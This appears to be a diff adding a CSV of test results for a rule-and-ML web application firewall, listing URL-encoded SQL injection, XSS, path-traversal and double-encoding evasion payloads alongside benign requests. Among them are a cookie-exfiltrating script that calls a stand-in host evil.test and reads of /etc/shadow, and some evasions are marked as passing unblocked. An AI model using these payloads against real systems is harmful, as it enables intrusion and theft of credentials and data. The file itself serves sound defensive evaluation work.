@@ -1,0 +1,94 @@
+group,expect,got,status,method,path,query,body,reason,ms
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20OR%20%271%27%3D%271&Submit=Submit,,Both agree: confirmed attack,17.0
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20OR%201%3D1--&Submit=Submit,,Both agree: confirmed attack,10.7
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%27%20OR%201%3D1%23&Submit=Submit,,Both agree: confirmed attack,9.5
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=admin%27--&Submit=Submit,,Case B – ML catches obfuscated payload [score=0.5537 >= 0.5],11.4
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--&Submit=Submit,,Both agree: confirmed attack,8.4
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20UNION%20SELECT%20NULL%2CNULL--&Submit=Submit,,"Case A – rule wins [rule=SQLi_001, ML=0.4070 < 0.5]",9.5
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%3B%20DROP%20TABLE%20users--&Submit=Submit,,"Case A – rule wins [rule=SQLi_004, ML=0.1927 < 0.5]",9.4
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%27%20OR%20%27a%27%3D%27a&Submit=Submit,,Case B – ML catches obfuscated payload [score=0.9704 >= 0.5],9.2
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20AND%20SLEEP%285%29--&Submit=Submit,,"Case A – rule wins [rule=SQLi_009, ML=0.4264 < 0.5]",10.8
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20AND%201%3D1--&Submit=Submit,,"Case A – rule wins [rule=SQLi_010, ML=0.3369 < 0.5]",10.5
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%20OR%201%3D1&Submit=Submit,,"Case A – rule wins [rule=SQLi_010, ML=0.2482 < 0.5]",10.6
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%27%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--&Submit=Submit,,Both agree: confirmed attack,11.7
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0--&Submit=Submit,,Both agree: confirmed attack,9.5
+sqli,block,block,403,GET,/vulnerabilities/sqli/,id=%22%20OR%20%22%22%3D%22&Submit=Submit,,Case B – ML catches obfuscated payload [score=0.9788 >= 0.5],10.3
+sqli,block,allow,302,GET,/vulnerabilities/sqli/,id=1%27%20ORDER%20BY%203--&Submit=Submit,,,42.4
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,Both agree: confirmed attack,17.0
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,,Both agree: confirmed attack,20.5
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Csvg%20onload%3Dalert%281%29%3E,,Both agree: confirmed attack,21.4
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cbody%20onload%3Dalert%281%29%3E,,Both agree: confirmed attack,16.3
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=javascript%3Aalert%281%29,,Both agree: confirmed attack,18.7
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,,Both agree: confirmed attack,18.0
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,,Both agree: confirmed attack,9.0
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.test%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E,,Both agree: confirmed attack,10.0
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3Ex%3C%2Fa%3E,,Both agree: confirmed attack,9.1
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,,"Case A – rule wins [rule=XSS_007, ML=0.1848 < 0.5]",9.7
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,,"Case A – rule wins [rule=XSS_007, ML=0.2747 < 0.5]",8.5
+xss,block,block,403,GET,/vulnerabilities/xss_r/,name=%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E,,Both agree: confirmed attack,11.7
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=..%2F..%2F..%2Fetc%2Fpasswd,,Both agree: confirmed attack,8.7
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=..%5C..%5C..%5Cwindows%5Cwin.ini,,Both agree: confirmed attack,9.9
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=....%2F%2F....%2F%2Fetc%2Fpasswd,,Both agree: confirmed attack,18.5
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=%2Fetc%2Fpasswd,,"Case A – rule wins [rule=PATH_005, ML=0.0289 < 0.5]",12.8
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=%252e%252e%252f%252e%252e%252fetc%252fpasswd,,Both agree: confirmed attack,9.5
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=..%2F..%2F..%2F..%2Fetc%2Fshadow,,Both agree: confirmed attack,8.7
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=%2Fproc%2Fself%2Fenviron,,"Case A – rule wins [rule=PATH_008, ML=0.1270 < 0.5]",9.4
+traversal,block,block,403,GET,/vulnerabilities/fi/,page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php,,"Case A – rule wins [rule=PATH_013, ML=0.2625 < 0.5]",8.8
+obfuscated,block,allow,302,GET,/,id=CASE%20WHEN%201%3D1%20THEN%201%20ELSE%200%20END,,,11.0
+obfuscated,block,block,403,GET,/,id=1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--,,Both agree: confirmed attack,9.6
+obfuscated,block,block,403,GET,/,id=1%27%20%2F%2A%2150000UNION%2A%2F%20%2F%2A%2150000SELECT%2A%2F%201%2C2--,,"Case A – rule wins [rule=SQLi_003, ML=0.3990 < 0.5]",9.7
+obfuscated,block,block,403,GET,/,id=1%20oR%201%3D1,,Both agree: confirmed attack,9.2
+obfuscated,block,block,403,GET,/,id=1%27%20AnD%20%271%27%3D%271,,Both agree: confirmed attack,9.7
+obfuscated,block,block,403,GET,/,id=IF%281%3D1%2CSLEEP%285%29%2C0%29,,Both agree: confirmed attack,14.0
+obfuscated,block,block,403,GET,/,id=%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29,,Both agree: confirmed attack,15.6
+obfuscated,block,block,403,GET,/,id=1%20AND%20ASCII%28SUBSTRING%28user%28%29%2C1%2C1%29%29%3E64,,Both agree: confirmed attack,16.6
+legit,allow,allow,302,GET,/,,,,13.7
+legit,allow,allow,200,GET,/login.php,,,,91.0
+legit,allow,allow,302,GET,/index.php,,,,11.3
+legit,allow,allow,200,GET,/about.php,,,,11.1
+legit,allow,allow,200,GET,/instructions.php,,,,11.0
+legit,allow,allow,200,GET,/setup.php,,,,10.9
+legit,allow,allow,302,GET,/vulnerabilities/sqli/,id=1&Submit=Submit,,,9.6
+legit,allow,allow,302,GET,/vulnerabilities/xss_r/,name=Alice,,,11.7
+legit,allow,allow,302,GET,/vulnerabilities/xss_r/,name=Bob%20Smith,,,16.9
+legit,allow,allow,404,GET,/search,q=red%20shoes%20size%2010,,,11.4
+legit,allow,allow,404,GET,/search,q=blue%20jeans,,,10.2
+legit,allow,allow,404,GET,/search,q=laptop%20bag,,,8.8
+legit,allow,allow,404,GET,/contact,email=john.doe%40example.com,,,10.0
+legit,allow,allow,404,GET,/products,page=2,,,9.1
+legit,allow,block,403,GET,/products,sort=price&order=asc,,Case B – ML catches obfuscated payload [score=0.5991 >= 0.5],9.3
+legit,allow,block,403,GET,/products,category=books&page=3,,Case B – ML catches obfuscated payload [score=0.5283 >= 0.5],8.0
+legit,allow,allow,404,GET,/user,id=42,,,9.5
+legit,allow,allow,404,GET,/user,name=thabo,,,10.0
+legit,allow,allow,404,GET,/search,city=Johannesburg,,,14.2
+legit,allow,allow,404,GET,/help,q=how%20to%20reset%20password,,,8.8
+legit,allow,allow,404,GET,/comment,text=Great%20product%2C%20thanks%21,,,10.4
+legit,allow,block,403,GET,/user,name=Anna-Marie,,Case B – ML catches obfuscated payload [score=0.8055 >= 0.5],8.1
+legit,allow,allow,404,GET,/search,q=cheap%20flights%20to%20Cape%20Town,,,9.6
+legit,allow,block,403,GET,/products,product=shoes&size=10,,Case B – ML catches obfuscated payload [score=0.5386 >= 0.5],8.8
+legit,allow,allow,302,GET,/,lang=en,,,11.1
+legit,allow,allow,404,GET,/verify,token=abc123def456,,,9.2
+legit,allow,allow,302,GET,/,ref=homepage,,,10.4
+legit,allow,allow,302,GET,/,utm_source=newsletter&utm_medium=email,,,10.5
+legit,allow,block,403,GET,/cart,item=17&qty=2,,Case B – ML catches obfuscated payload [score=0.9032 >= 0.5],10.7
+legit,allow,allow,404,GET,/orders,status=shipped,,,9.6
+legit_hard,allow,block,403,GET,/search,name=O%27Brien,,Case B – ML catches obfuscated payload [score=0.8163 >= 0.5],9.9
+legit_hard,allow,allow,404,GET,/search,q=select%20a%20size,,,9.4
+legit_hard,allow,allow,404,GET,/search,comment=I%20want%20to%20update%20my%20order%20or%20delete%20it,,,11.2
+legit_hard,allow,allow,404,GET,/search,q=where%20is%20the%20nearest%20store%20from%20here,,,9.0
+legit_hard,allow,allow,404,GET,/search,title=Tom%20%26%20Jerry,,,10.5
+legit_hard,allow,allow,404,GET,/search,q=1%20or%202%20items,,,9.5
+legit_hard,allow,allow,404,GET,/search,msg=Drop%20me%20a%20line,,,11.3
+legit_hard,allow,allow,404,GET,/search,q=insert%20coin,,,9.6
+legit_hard,allow,allow,404,GET,/search,note=use%20the%20union%20room,,,10.2
+legit_hard,allow,allow,404,GET,/search,path=docs%2Freadme.txt,,,9.0
+evasion,block,allow,302,GET,/vulnerabilities/sqli/,id=1%2527%2520OR%2520%25271%2527%253D%25271,,,11.4
+evasion,block,block,403,GET,/vulnerabilities/sqli/,id=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,,Case B – ML catches obfuscated payload [score=0.8642 >= 0.5],8.5
+evasion,block,block,403,GET,/vulnerabilities/sqli/,id=1%2520UNION%2520SELECT%2520user%252Cpassword%2520FROM%2520users--,,Both agree: confirmed attack,9.9
+evasion,block,allow,302,GET,/vulnerabilities/sqli/,id=..%252F..%252F..%252Fetc%252Fpasswd,,,9.5
+evasion,block,block,403,GET,/vulnerabilities/sqli/,id=1%2527%253B%2520DROP%2520TABLE%2520users--,,"Case A – rule wins [rule=SQLi_003, ML=0.4639 < 0.5]",9.3
+post_form,block,allow,302,POST,/vulnerabilities/sqli/,,id=1%27%20OR%20%271%27%3D%271,,9.5
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,Case B – ML catches obfuscated payload [score=0.8621 >= 0.5],9.7
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,id=1%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--,Both agree: confirmed attack,8.3
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,user=admin%27--,"Case A – rule wins [rule=SQLi_003, ML=0.2177 < 0.5]",9.1
+post_form,block,block,403,POST,/vulnerabilities/sqli/,,id=1%3B%20DROP%20TABLE%20users--,"Case A – rule wins [rule=SQLi_003, ML=0.3939 < 0.5]",7.8
